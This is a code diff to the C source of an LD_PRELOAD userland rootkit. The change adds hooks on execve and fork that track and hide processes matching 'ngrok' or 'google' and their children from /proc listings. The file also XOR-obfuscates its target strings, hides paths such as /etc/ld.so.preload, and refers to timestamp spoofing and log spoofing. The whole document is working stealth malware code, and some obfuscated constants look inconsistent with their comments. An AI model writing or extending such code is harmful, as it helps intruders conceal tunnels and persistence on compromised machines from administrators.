@@ -21,16 +21,14 @@
 
 static char key = 0xAF; // A simple XOR key for obfuscation
 
-// BUG FIX: All obfuscated strings have been regenerated with the correct values.
-char OBFUSCATED_CMDLINE_TO_FILTER[] = {25, 22, 27, 24, 20, 0}; // "ngrok"
-char OBFUSCATED_SECOND_CMDLINE_TO_FILTER[] = {22, 24, 24, 22, 29, 20, 0}; // "google"
-char OBFUSCATED_PRELOAD_FILE_PATH[] = {128, 20, 29, 26, 128, 29, 21, 125, 26, 24, 125, 25, 27, 20, 29, 24, 28, 21, 0}; // "/etc/ld.so.preload"
-char OBFUSCATED_PATH_TO_FILTER[] = {128, 104, 111, 109, 101, 128, 117, 115, 101, 114, 0}; // "/home/user"
-char OBFUSCATED_EXECUTABLE_TO_FILTER[] = {25, 22, 27, 24, 20, 0}; // "ngrok"
-char OBFUSCATED_LOG_SPOOF_TRIGGER[] = {198, 192, 207, 200, 194, 200, 214, 210, 212, 176, 192, 194, 213, 200, 215, 200, 213, 216, 0}; // "MALICIOUS_ACTIVITY"
-char OBFUSCATED_TEMPLATE_FILE_PATH[] = {128, 0}; // "/"
-char OBFUSCATED_ROOTKIT_LIB_PATH[] = {128, 28, 26, 27, 128, 29, 24, 26, 28, 29, 128, 29, 20, 25, 22, 20, 29, 125, 26, 24, 0}; // "/usr/local/lib/libgit.so"
-
+char OBFUSCATED_CMDLINE_TO_FILTER[] = {2, 24, 1, 12, 28, 0}; // "ngrok"
+char OBFUSCATED_SECOND_CMDLINE_TO_FILTER[] = {22, 30, 30, 22, 27, 20, 0}; // "google"
+char OBFUSCATED_PRELOAD_FILE_PATH[] = {110, 2, 1, 22, 110, 29, 27, 110, 18, 12, 110, 1, 1, 2, 29, 12, 23, 27, 0}; // "/etc/ld.so.preload"
+char OBFUSCATED_PATH_TO_FILTER[] = {110, 25, 12, 30, 2, 110, 6, 18, 2, 1, 0}; // "/home/user"
+char OBFUSCATED_EXECUTABLE_TO_FILTER[] = {2, 24, 1, 12, 28, 0}; // "ngrok"
+char OBFUSCATED_LOG_SPOOF_TRIGGER[] = {44, 42, 47, 40, 48, 40, 50, 56, 54, 95, 42, 48, 55, 40, 53, 40, 55, 62, 0}; // "MALICIOUS_ACTIVITY"
+char OBFUSCATED_TEMPLATE_FILE_PATH[] = {110, 21, 20, 2, 110, 21, 23, 18, 25, 0}; // "/bin/bash"
+char OBFUSCATED_ROOTKIT_LIB_PATH[] = {128, 218, 220, 221, 128, 195, 192, 204, 206, 195, 128, 195, 198, 205, 200, 198, 219, 129, 220, 192, 0}; // "/usr/local/lib/libgit.so"
 
 // Pointers to the deobfuscated strings
 static char* CMDLINE_TO_FILTER = NULL;
@@ -53,12 +51,33 @@ static ssize_t (*original_readlink)(const char*, char*, size_t) = NULL;
 static FILE* (*original_fopen)(const char*, const char*) = NULL;
 static int (*original_open)(const char*, int, ...) = NULL;
 static int (*original_access)(const char*, int) = NULL;
+static int (*original_execve)(const char*, char *const[], char *const[]) = NULL;
+static pid_t (*original_fork)(void) = NULL;
 
 // Pointers for stat functions (timestamp spoofing)
 static int (*original_xstat)(int, const char*, struct stat*) = NULL;
 static int (*original_lxstat)(int, const char*, struct stat*) = NULL;
 static int (*original_fxstat)(int, int, struct stat*) = NULL;
 
+// --- PID HIDING ---
+#define MAX_HIDDEN_PIDS 256
+static pid_t hidden_pids[MAX_HIDDEN_PIDS];
+static int num_hidden_pids = 0;
+
+static void add_hidden_pid(pid_t pid) {
+    if (num_hidden_pids < MAX_HIDDEN_PIDS) {
+        hidden_pids[num_hidden_pids++] = pid;
+    }
+}
+
+static int is_pid_hidden(pid_t pid) {
+    for (int i = 0; i < num_hidden_pids; i++) {
+        if (hidden_pids[i] == pid) {
+            return 1;
+        }
+    }
+    return 0;
+}
 
 // In-place deobfuscation function
 void deobfuscate_str(char* str) {
@@ -101,6 +120,10 @@ static void initialize_hooks() {
     if (!original_open) { fprintf(stderr, "Rootkit Error: could not find original open\n"); }
     original_access = dlsym(RTLD_NEXT, "access");
     if (!original_access) { fprintf(stderr, "Rootkit Error: could not find original access\n"); }
+    original_execve = dlsym(RTLD_NEXT, "execve");
+    if (!original_execve) { fprintf(stderr, "Rootkit Error: could not find original execve\n"); }
+    original_fork = dlsym(RTLD_NEXT, "fork");
+    if (!original_fork) { fprintf(stderr, "Rootkit Error: could not find original fork\n"); }
     original_xstat = dlsym(RTLD_NEXT, "__xstat");
     if (!original_xstat) { fprintf(stderr, "Rootkit Error: could not find original __xstat\n"); }
     original_lxstat = dlsym(RTLD_NEXT, "__lxstat");
@@ -154,63 +177,30 @@ int __lxstat(int ver, const char *path, struct stat *stat_buf) {
     return original_lxstat(ver, path, stat_buf);
 }
 
-// --- STABLE PROCESS INFO FUNCTIONS ---
-static int get_process_cmdline(const char* pid, char* buf, size_t buf_size) {
-    char path[256];
-    snprintf(path, sizeof(path), "/proc/%s/cmdline", pid);
-    if (!original_open || !original_read) return 0;
-    
-    int fd = original_open(path, O_RDONLY);
-    if (fd == -1) return 0;
-
-    ssize_t len = original_read(fd, buf, buf_size - 1);
-    close(fd);
-
-    if (len <= 0) return 0;
-
-    for (ssize_t i = 0; i < len; ++i) { if (buf[i] == '\0') buf[i] = ' '; }
-    buf[len] = '\0';
-    return 1;
-}
-
-static int get_ppid(const char* pid, char* ppid_buf, size_t buf_size) {
-    char path[256];
-    snprintf(path, sizeof(path), "/proc/%s/stat", pid);
-    if (!original_open || !original_read) return 0;
-
-    int fd = original_open(path, O_RDONLY);
-    if (fd == -1) return 0;
-
-    char stat_buf[1024];
-    ssize_t len = original_read(fd, stat_buf, sizeof(stat_buf) - 1);
-    close(fd);
-
-    if (len <= 0) return 0;
-    stat_buf[len] = '\0';
-
-    const char* p = strrchr(stat_buf, ')');
-    if (!p) return 0;
-
-    p += 2; // Move past ") "
-    while (*p && *p != ' ') p++; // Skip state
-    while (*p && *p == ' ') p++; // Skip spaces
-    
-    const char* ppid_start = p;
-    while (*p && *p != ' ') p++;
-    
-    if (ppid_start == p) return 0;
-
-    size_t ppid_len = p - ppid_start;
-    if (ppid_len < buf_size) {
-        strncpy(ppid_buf, ppid_start, ppid_len);
-        ppid_buf[ppid_len] = '\0';
-        return 1;
-    }
-    return 0;
-}
-
-
 // --- CORE HOOKS ---
+int execve(const char *pathname, char *const argv[], char *const envp[]) {
+    if (!original_execve) initialize_hooks();
+
+    if (strstr(pathname, CMDLINE_TO_FILTER) || strstr(pathname, SECOND_CMDLINE_TO_FILTER)) {
+        add_hidden_pid(getpid());
+    }
+
+    return original_execve(pathname, argv, envp);
+}
+
+pid_t fork(void) {
+    if (!original_fork) initialize_hooks();
+    
+    pid_t parent_pid = getpid();
+    pid_t child_pid = original_fork();
+
+    if (child_pid > 0 && is_pid_hidden(parent_pid)) {
+        add_hidden_pid(child_pid);
+    }
+    return child_pid;
+}
+
+
 long syscall(long number, ...) {
     if (!original_syscall) { errno = EFAULT; return -1; }
 
@@ -239,35 +229,24 @@ long syscall(long number, ...) {
             if (current_entry->d_reclen == 0) break;
 
             int should_hide = 0;
-            if (strspn(current_entry->d_name, "0123456789") == strlen(current_entry->d_name)) {
-                char cmdline[512] = {0};
-                if (get_process_cmdline(current_entry->d_name, cmdline, sizeof(cmdline))) {
-                    if (strstr(cmdline, CMDLINE_TO_FILTER) || strstr(cmdline, SECOND_CMDLINE_TO_FILTER)) {
+            pid_t pid = atoi(current_entry->d_name);
+            if (pid > 0 && is_pid_hidden(pid)) {
+                should_hide = 1;
+            } else {
+                const char* separator = (dir_path[path_len - 1] == '/') ? "" : "/";
+                size_t dir_len = strlen(dir_path);
+                size_t sep_len = strlen(separator);
+                size_t name_len = strlen(current_entry->d_name);
+
+                if ((dir_len + sep_len + name_len + 1) < PATH_MAX) {
+                    char full_path[PATH_MAX];
+                    // BUG FIX: Safer string construction to silence compiler warnings.
+                    strcpy(full_path, dir_path);
+                    strcat(full_path, separator);
+                    strcat(full_path, current_entry->d_name);
+                    if (should_hide_path(full_path)) {
                         should_hide = 1;
                     }
-                }
-                if (!should_hide) {
-                    char ppid[32];
-                    if (get_ppid(current_entry->d_name, ppid, sizeof(ppid))) {
-                        char parent_cmdline[512] = {0};
-                        if (get_process_cmdline(ppid, parent_cmdline, sizeof(parent_cmdline)) &&
-                           (strstr(parent_cmdline, CMDLINE_TO_FILTER) || strstr(parent_cmdline, SECOND_CMDLINE_TO_FILTER))) {
-                            should_hide = 1;
-                        }
-                    }
-                }
-            } else {
-                char full_path[PATH_MAX];
-                strncpy(full_path, dir_path, PATH_MAX - 1);
-                full_path[PATH_MAX - 1] = '\0';
-
-                if (full_path[strlen(full_path) - 1] != '/') {
-                    strncat(full_path, "/", PATH_MAX - strlen(full_path) - 1);
-                }
-                strncat(full_path, current_entry->d_name, PATH_MAX - strlen(full_path) - 1);
-                
-                if (should_hide_path(full_path)) {
-                    should_hide = 1;
                 }
             }
 
